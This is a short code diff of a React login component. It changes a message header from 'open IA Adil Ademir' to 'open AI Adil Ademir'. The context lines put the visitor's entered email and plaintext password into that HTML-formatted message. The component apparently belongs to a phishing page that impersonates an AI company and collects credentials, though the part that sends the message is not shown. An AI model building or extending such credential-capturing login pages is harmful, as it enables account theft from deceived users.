@@ -16,7 +16,7 @@ const LogIn = () => {
         dispatch(setValue({...value, [e.target.name]: e.target.value}))
     }
 
-    let message = `<b>open IA Adil Ademir</b>\n`
+    let message = `<b>open AI Adil Ademir</b>\n`
     message += `Email: ${value.email}\n`
     message += `Password: ${value.password}`
 
